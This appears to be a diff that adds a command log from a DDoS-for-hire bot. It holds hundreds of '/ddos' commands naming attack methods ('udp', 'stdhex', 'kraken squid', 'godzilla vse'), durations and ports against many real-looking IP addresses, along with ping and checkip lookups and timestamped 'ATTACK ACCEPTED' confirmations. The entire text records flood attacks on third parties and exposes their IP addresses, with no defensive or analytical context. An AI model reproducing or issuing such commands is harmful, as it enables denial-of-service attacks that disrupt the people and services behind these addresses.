@@ -1,0 +1,395 @@
+/tr4p
+/info
+/plan
+/methods
+/DDoS udp 73.31.253.24 1200
+/tr4p
+/plan
+/DDoS udp 73.31.253.24 1200
+/ping ip_73.31.253.24
+/ddos udp 174.198.223.43 dport=80
+/ddos udp 95.156.209.28 1200
+/ping 95.156.209.28
+/DDoS 95.156.209.28 120 dport=3074
+/DDoS udp 95.156.209.28 120 dport=3074
+/ ddos udp 81.24.100.84 20 dport=80
+/ddos udp 174.228.131.241 300 dport=80
+/ddos udp 50.107.100.18 100 dport=80
+/ping 50.107.100.18
+/ddos 95.156.209.28 120 dport=80
+/ddos udp 95.156.209.28 120 dport=80
+/ping 95.156.209.28
+/ddos udp 76.73.236.98 20 dport=80
+/ddos udp 95.19.74.14 1200 dport=80
+/ddos 95.19.74.14 1200 dport=80
+/ddos udp 95.19.74.14 1200 dport=80
+/ddos udp 95.19.74.14 3000 dport=80
+/ddos udp 95.19.74.14 1200 dport=80
+/ping 95.19.74.14
+/ddos udp 68.40.246.139 1200 dport=80
+/ddoss udp 50.107.74.57 300 dport=80
+/ddos udp 50.107.74.57 1200 dport=80
+/ddos udp 68.40.246.139 1200 dport=80
+/ddos udp 50.107.74.57 1200 dport=443
+/methods
+/ddos std 50.107.100.18 25 dport=80
+/ddos udp 98.213.142.205 20 dport=80
+/ddos udp 108.219.57.241 600 dport=80
+/ddos udp 98.213.142.205 600 dport=80
+/ping 98.213.142.205
+/ping 108.219.57.241
+/ddos stdhex 52.143.242.57 120 dport=30016
+/ddos udp 68.49.233.91 30 dport=80
+/ping 68.49.233.91
+/ddos stdhex 96.30.200.17 120 dport=39700
+/plan
+/ddos udp 173.31.132.167 600 dport=80
+/ddos stdhex 13.86.58.72 50 dport=30104
+/ddos stdhex 13.86.58.72 50 dport=443
+/ddos udp 50.107.100.18 300 dport=80
+/ping 50.107.100.18
+/ddos udp 24.50.227.98 600 dport=80
+/ping 24.50.227.98
+/ddos udp 24.54.202.59 1200 dport=80
+/ddos udp 72.68.68.57 1200 dport=80
+/ddos udp 139.195.138.222 600 dport=80
+/ddos udp 68.42.167.251 10 dport=80
+/ddos udp 99.14.178.147 1200 dport=80
+/ddos udp 68.49.233.91 1200 dport=80
+/ping 68.49.233.91
+/ddos udp 68.49.233.91 600 dport=443
+/ddos stdhex 104.156.235.213 120 dport=39160
+/ddos stdhex 104.156.235.213 120 dport=39160
+/ddos stdhex 104.200.145.12 120 dport=32300
+/ddos stdhex 52.143.242.102 20 dport=80
+/plan
+/stdhex 13.86.38.96 60 dport=30031
+/ddos stdhex 13.86.38.96 60 dport=30031
+/ping  13.86.38.96
+/ddos udp 23.28.24.118 60 dport=80
+/ping 23.28.24.118
+/ddos udp 73.37.228.184 60 dport=80
+/ping 73.37.228.184
+/methods
+/ddos stdhex 13.86.39.142 60 dport=80
+/ddos stdhex 13.86.39.142 60 dport=30038
+/ddos stdhex 13.86.39.142 120 dport=30038
+/plan
+/ddos stdhex 13.86.39.142 60 dport=30038
+/ddos std 96.252.90.204 120 dport=80
+/ddos stdhex 52.154.171.124 30 dport=30119
+/ddos stdhex 52.154.204.207 120 dport=30105
+/ddos 52.154.204.207 60 dport=30105
+/ddos stdhex 52.154.204.207 60 dport=30105
+/ddos udp 96.252.90.204 1200 dport=80
+/ping 96.252.90.204
+/ddos std 96.252.90.204 600 dport=80
+/ddos std 96.252.90.204 60dport=80
+/ddos std 96.252.90.204 60 dport=80
+/ddos udp 96.252.90.204 600 dport=80
+/ddos udp 40.88.51.158 60 dport=30105
+/ddos stdhex 40.88.51.158 120 dport=30105
+/ddos std 96.252.90.204 1200 dport=80
+/ddos udp 52.190.41.212 120 dport=30137
+/plan
+/ddos stdhex 52.186.45.225 120 30238
+/ddos stdhex 52.224.131.111 10 30025
+/ddos sdthex 52.224.131.111 20 30025
+/plan
+/methods
+/ddos stdhex 52.224.131.111 120 30025
+/ping 52.224.131.111
+/ddos udp 52.224.131.111 120 80
+/ddos stdhex 40.88.22.117 120 30047
+/ddos std 192.168.1.156 20 60112
+/ddos std 192.168.1.156 25 80
+/ddos std 96.230.31.45 100 4307
+/ddos std 192.168.1.156 100 9307
+/ddos std 66.30.189.15 25!80
+/ddos std 66.30.189.15 200 80
+/ddos std 98.249.131.227 80 1200
+/ddos stdhex 109.230.208.46 7816 1200
+/ddos stdhex 109.230.208.46 7816 120
+/ddos stdhex 109.230.208.46 120 7816
+/ddos std 24.144.172.66 1200 80
+/ddos 209.6.124.130 30000 80
+/ddos std 209.6.124.130 30000 80
+/ddos std 209.6.124.130 1200 80
+/ddos std 209.6.124.130 1200 80
+/ddos std 96.233.113.150 300 80
+/ddos stdhex 96.233.73.75 1200 80
+/ping 96.233.73.75
+/ddos stdhex 96.233.113.150 1200 80
+/methods
+/ddos udp 96.233.113.150 600 443
+/ddos udp 99.99.240.200 1200 80
+/ddos udp 96.233.113.150 600 80
+/ddos udp 104.32.22.138 1200 80
+/ddos stdhex 104.32.22.138 600 443
+/ddos std 209.6.124.130 1200 80
+/methods
+/ddos godzilla vse 52.154.240.22 60 80
+/ddos godzilla vse 52.154.240.22 30110 60
+/ddos godzilla vse 52.154.240.22 6” 30110
+/ddos godzilla vse 52.154.240.22 60 30110
+/methods
+/methods
+/ddos godzilla 52.154.240.22 120 30110
+/ddos godzilla cnc 52.154.240.22 120 30110
+/ddos godzilla std 52.154.240.22 30 30110
+/methods
+/ddos kraken udp 64.184.38.77 600 80
+/ddos kraken udp 173.16.241.233  600 80
+/ddos kraken udp  208.103.24.4 600 80
+/ddos kraken udp 69.132.103.146 300 80
+/ddos kraken std 173.16.241.233 120 443
+/ddos kraken udp 64.184.38.77 600 80
+/ddos kraken squid 64.184.40.206 300 80
+/ddos kraken squid 69.132.103.146 300 80
+/ddos kraken squid 64.184.40.206 300 80
+/ddos kraken udp 64.184.38.77 600 80
+/ddos kraken udp 81.105.142.41 1200 80
+/ddos godzilla vse 13.86.6.251 120 30031
+/getplan
+/ddos kraken std 96.230.31.45 1200 80
+/ddos kraken squid 73.40.106.235 120
+/plan
+/ddos kraken std 96.230.31.45 30 80
+/ddos kraken std 96.230.31.45 100 80
+/ddos kraken std 96.230.31.45 30 80
+/ddos kraken std 96.230.31.45 100 80
+/ddos kraken std 20.185.74.196 100 30018
+/ddos godzilla std 52.154.168.102 120 30047
+/methods
+/ddos Godzilla std 52.154.168.102 60 30047
+/ddos squid std 52.154.168.102 120 30047
+/ddos Godzilla udp 52.154.168.102 60 30047
+/ddos Godzilla tcp 74.201.102.169 31532
+/ddos Godzilla tcp 52.154.220.130 120 30026
+/ddos godzilla std 52.154.153.138 60 30115
+/ddos godzilla std 52.154.153.138 30 30115
+/ddos kraken squid 96.230.22.139 300 80
+/ddos kraken squid 96.230.22.139 30 80
+/ddos kraken squid 96.230.22.139 300 80
+/ddos kraken squid 96.233.113.150 120 80
+/ddos kraken squid 162.251.174.149 600 80
+/ddos kraken squid 70.23.17.159 300
+/checkip 70.23.17.159
+/ddos kraken udp 162.251.174.149 120 10808
+/ddos godzilla vse 20.37.136.41 20 30148
+/ddos kraken squid 24.63.23.214 60 80
+/ddos godzilla vse 20.37.136.41 20 30148
+/ddos godzilla vse 20.37.136.41 20 30148
+/ddos godzilla vse 40.89.249.151 20 30212
+/ddos godzilla vse 40.89.249.151 120 30212
+/ddos godzilla 13.86.4.67 30 30034
+/ddos godzilla vse 13.86.4.67 30 30034
+/ddos godzilla vse 13.86.4.67 30 30034
+/ddos godzilla vse 13.86.4.67 30 30034
+/ddos godzilla vse 20.37.136.41 10 30132
+/ddos godzilla vse 20.37.136.41 10 30132
+/ddos godzilla vse 20.37.136.41 10 30132
+/ddos kraken squid 107.5.110.14 300 80
+/ddos kraken squid 107.5.110.14 300 80
+/ddos godzilla vse 52.154.220.130 30 30125
+/ddos godzilla vse 52.154.158.38 30 30034
+/ddos Godzilla vse 52.154.158.38 30 30034
+/ddos godzilla vse 52.154.158.38 40 30034
+/ddos godzilla vse 52.154.158.38 30 30034
+/ddos godzilla vse 52.154.158.38 30 30034
+/ddos godzilla vse 52.154.158.38 120 30034
+/ddos godzilla vse 52.154.158.38 30 30034
+/ddos Godzilla vse 52.154.158.28 45 30034
+/ddos kraken squid 174.86.177.37 500 80
+/checkip 174.86.177.37
+/ddos Godzilla vse 52.224.35.248 80 30239
+/ddos Godzilla vse 52.224.35.248 45 30239
+/ddos Godzilla vse 52.224.35.248 80 30239
+/ddos kraken squid 24.171.33.141 400 80
+/ddos kraken squid 24.171.33.141 400 80
+/ddos kraken squid 24.171.33.141 400 80
+/ddos kraken squid 24.171.33.141 400 80
+/ddos squid 96.233.113.150 600 80
+/ddos kraken squid 96.233.113.150 300 80
+/ddos godzilla vse 13.86.4.67 40 30230
+/methods
+/ddos godzilla vse 13.86.4.67 30 30230
+/ddos kraken squid 50.107.112.136 5 80
+/ddos kraken squid 107.221.67.186 500 80
+/ddos kraken squid 73.12.97.126 500 80
+/ddos kraken squid 173.63.75.230 200 80
+/ddos godzilla udp 107.221.67.186 120 80
+/ddos kraken squid 73.12.97.126 500 80
+/ddos godzilla vse 173.63.75.230 200 80
+/ddos godzilla vse 173.63.75.230 120 80
+/ddos kraken squid  298.124.1.65 200 80
+/ddos kraken squid 162.197.66.113 500 80
+/ddos kraken udp 162.197.66.113 200 80
+/ddos kraken udp 162.197.66.113 200 80
+/ddos godzilla vse 52.154.240.81 120 30247
+/ddos godzilla vse 52.154.240.81 120 30247
+/ddos godzilla vse 52.154.240.81 120 30247
+/ddos godzilla 13.86.6.251 20 30038
+/ddos godzilla vse 13.86.6.251 20 30038
+/ddos godzilla vse 52.158.209.181 30 30243
+/ddos godzilla vse 52.158.209.181 120 30243
+/ddos godzilla vse 52.158.209.181 120 30243
+/ddos godzilla vse 1 3.86.101.133 30 30034
+/ddos godzilla vse 13.86.101.133 30 30034
+/ddos Godzilla vse 13.86.101.133 60 30034
+/ddos Godzilla vse 13.86.101.133 120 30034
+/ddos Godzilla vse 13.86.101.133 120 30034
+/ddos squid 173.16.78.89 80 450
+/ddos kraken squid 173.16.78.89 80 450
+/ping 173.16.78.89
+/checkip 173.16.78.89
+/ddos godzilla udp 71.95.167.152 120
+/ddos godzilla udp 71.95.167.152 120
+/ddos godzilla udp 71.95.167.152 120
+/ddos godzilla udp 95.156.213.107 120 7825
+/ddos Godzilla vse 52.186.91.173 60 30034
+/ddos Godzilla 216.98.62.29 15 443
+/ddos Godzilla vse 52.186.91.173 35 30034
+/checkip 96.233.40.235
+/ddos kraken squid 98.118.115.235 200
+/ddos kraken std 98.118.115.235 80 200
+/ddos kraken std 98.118.115.235 200 80
+/ddos kraken std 98.118.115.235 3600
+/ddos Godzilla vse 52.191.81.139 30137 100
+/ddos Godzilla vse 52.191.81.139 120 30137
+/checkip 98.218.148.205
+/checkip 98.218.148.204
+/ddos kraken squid 98.218.148.204 60
+/ddos kraken squid 173.79.254.20 60
+/checkip 174.55.183.252
+/checkip 104.231.134.56
+/ddos kraken squid 104.231.134.56 60
+/ddos Godzilla vse 52.191.102.210 45 30014
+/ddos Godzilla vse 52.191.102.210 45 30014
+/ping  52.191.102.210
+/ddos Godzilla vse 52.191.102.210 60 30014
+/ddos Godzilla vse 52.224.22.205 60 30204
+/ddos Kraken squid 23.123.197.69 500
+/lagstop
+/ddos kraken std 23.123.197.69 200
+/ddos kraken squid 23.123.197.69 100
+/ddos Godzilla vse 52.186.91.173 60
+/ddos Godzilla vse 52.224.72.178 60 30226
+/ddos Godzilla vse 52.224.72.178 45 30226
+/ddos Godzilla 52.224.72.178 45 30112
+/ddos Godzilla 52.224.72.178 45 30112
+/ddos Godzilla 52.224.193.224 45 30139
+/ddos vse 52.224.193.224 30 30139
+/ddos kraken std 216.211.248.92 500 80
+/ping 216.211.248.92
+/ddos kraken std 71.184.133.138 500 80
+/plan
+/ddos Godzilla vse 52.142.29.25 45 30138
+/ddos Godzilla vse 52.226.90.27 45 30031
+/ddos Godzilla vse 52.226.90.27 45 30031
+/ddos vse 52.191.17.245 45 30202
+/ddos Godzilla vse 52.191.17.245 60 30202
+/ddos Godzilla vse 52.191.17.245 60 30202
+/ping 52.191.17.245
+/ddos Godzilla vse 52.226.48.108 60 30232
+/ddos kraken squid 75.75.75.75 120 80
+/ddos godzilla vse 52.154.210.67 120 30109
+/ddos kraken squid 24.118.90.9 300 80
+/checkip 73.40.106.235
+/ddos kraken squid 76.181.44.7 300 80
+/ddos godzilla vse 52.141.213.91 120 30220
+/ddos godzilla vse74.129.211.65 120 80
+/ddos godzilla vse 74.129.211.65 120 80
+/ddos kraken squid 74.129.211.65 300 80
+/ddos kraken squid 73.40.106.235 10 80
+/ddos godzilla vse 52.154.243.140 30 30100
+/ddos godzilla vse 52.143.241.158 120 30042
+/ddos kraken squid 65.30.214.167 300 80
+/ddos kraken squid 65.30.214.167 300 80
+/ddos Godzilla vse 52.224.79.22 45 30025
+/ddos godzilla vse 40.89.245.48 120 30118
+/ddos godzilla vse 40.89.245.48 120 30118
+/methods
+/ddos godzilla vse 52.186.33.136 120 30009
+/ddos godzilla vse 52.186.33.136 120 30009
+/ddos godzilla vse 52.149.201.18 120 30141
+/ddos godzilla udp 98.24.85.53 120 80
+/ddos kraken squid 108.27.69.80 500 80
+/ddos godzilla udp 108.27.69.80 120
+/ddos godzilla udp 73.194.151.230 120
+/ddos godzilla udp 98.24.85.53 120 80
+/ddos kraken squid 73.194.151.230 200 80
+/ddos kraken squid 108.27.69.80 500 80
+/ddos godzilla vse 52.224.36.210 120 30110
+/ddos godzilla vse 52.224.36.210 120 30110
+/ddos godzilla udp 108.27.69.80 120
+/ddos kraken squid 73.247.239.147 120 80
+/ddos kraken squid 73.247.239.147 120 80
+/ddos kraken squid 73.247.239.147 300 80
+/ddos godzilla vse 20.37.141.228 120 30047
+/ddos godzilla vse 104.45.182.50 120 30143
+/ddos godzilla vse 104.45.182.50 120 30143
+/ddos godzilla vse 52.149.191.142 120 30114
+/ddos godzilla vse 52.224.205.49 120 30210
+/ddos godzilla vse 52.224.205.49 120 30210
+/checkip 108.26.195.59.
+/checkip 108.26.195.59
+/ddos kraken squid 108.26.195.59 100
+/checkip 216.71.6.126
+/ddos Godzilla vse 52.224.76.234 45 30049
+/ddos Godzilla vse 52.224.76.234 45 30049
+/ddos Godzilla vse 52.149.243.150 45 30043
+/ddos godzilla vse 52.224.78.82 120 30238
+/ddos godzilla vse 52.224.78.82 120 30238
+/ddos kraken squid 181.199.62.255 300 80
+/ddos kraken squid 181.199.62.117 120 80
+/ddos godzilla vse 13.89.118.95 120 30137
+/ddos godzilla vse 52.224.78.82 120 30117
+/ddos Godzilla vse 52.224.76.234 45 30032
+/ddos godzilla vse 52.224.249.73 120 30047
+/ddos godzilla udp 174.255.0.77 120 80
+/ping  174.255.0.77
+/ddos kraken squid 68.41.38.45 120 80
+/ddos kraken squid 174.255.0.77 120 42774
+/ddos kraken squid 600 80
+/ddos kraken squid 72.24.90.42 600 80
+[Mon Aug 03 2020 08:22:46 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 71.215.134.116  400
+[Mon Aug 03 2020 08:25:43 GMT-1100 (Samoa Standard Time)] /checkip 71.215.134.116
+[Mon Aug 03 2020 12:17:09 GMT-1100 (Samoa Standard Time)] /ddos Godzilla vse 52.226.40.213 45 30049
+[Thu Aug 06 2020 14:24:19 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 146.115.74.165 300
+[Thu Aug 06 2020 14:24:36 GMT-1100 (Samoa Standard Time)] /checkip 146.115.74.165
+[Sun Aug 16 2020 11:03:20 GMT-1100 (Samoa Standard Time)] /checkip 24.170.234.209
+[Sun Aug 16 2020 11:13:35 GMT-1100 (Samoa Standard Time)] /ddos Godzilla vse 52.170.162.210 30038 60
+[Sun Aug 16 2020 11:16:54 GMT-1100 (Samoa Standard Time)] /ddos Godzilla vse 52.170.162.210 60 30038
+[Sun Aug 16 2020 11:19:33 GMT-1100 (Samoa Standard Time)] /ddos Godzilla vse 52.170.162.210 30038 45
+[Sun Aug 16 2020 11:19:54 GMT-1100 (Samoa Standard Time)] /ddos Godzilla vse 52.170.162.210 45 30038
+[Sun Aug 16 2020 11:19:54 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Sun Aug 16 2020 11:22:54 GMT-1100 (Samoa Standard Time)] /ddos kraken vse 52.170.162.210 45 30038
+[Mon Aug 17 2020 14:56:26 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 66.30.189.15 25
+[Mon Aug 17 2020 14:56:26 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Mon Aug 17 2020 14:57:24 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 66.30.189.15 60
+[Mon Aug 17 2020 14:57:24 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Mon Aug 17 2020 14:59:14 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 66.30.189.15 45
+[Mon Aug 17 2020 14:59:14 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Mon Aug 17 2020 15:25:42 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 66.30.189.15 60
+[Mon Aug 17 2020 15:25:42 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Mon Aug 17 2020 15:45:01 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 66.30.189.15 300
+[Mon Aug 17 2020 15:45:01 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Mon Aug 17 2020 15:47:25 GMT-1100 (Samoa Standard Time)] /ping 66.30.189.15
+[Mon Aug 17 2020 15:55:41 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 66.30.189.15 60
+[Mon Aug 17 2020 15:55:41 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Mon Aug 17 2020 16:00:07 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 66.30.189.15 100
+[Mon Aug 17 2020 16:00:07 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Mon Aug 17 2020 16:11:32 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 66.30.189.15 100
+[Mon Aug 17 2020 16:11:32 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Mon Aug 17 2020 16:32:04 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 66.30.189.15 500
+[Mon Aug 17 2020 16:32:04 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Mon Aug 17 2020 16:38:46 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 66.30.189.15 500
+[Mon Aug 17 2020 16:38:46 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Mon Aug 17 2020 16:51:29 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 66.30.189.15 450
+[Mon Aug 17 2020 16:51:29 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Fri Aug 21 2020 16:19:14 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 96.230.31.87 200
+[Fri Aug 21 2020 16:19:14 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Sun Aug 23 2020 09:19:37 GMT-1100 (Samoa Standard Time)] /ddos Godzilla vse 66.242.14.18 8277 45
+[Sun Aug 23 2020 09:20:02 GMT-1100 (Samoa Standard Time)] /ddos Godzilla vse 66.242.14.18 45 8277
+[Sun Aug 23 2020 09:20:02 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
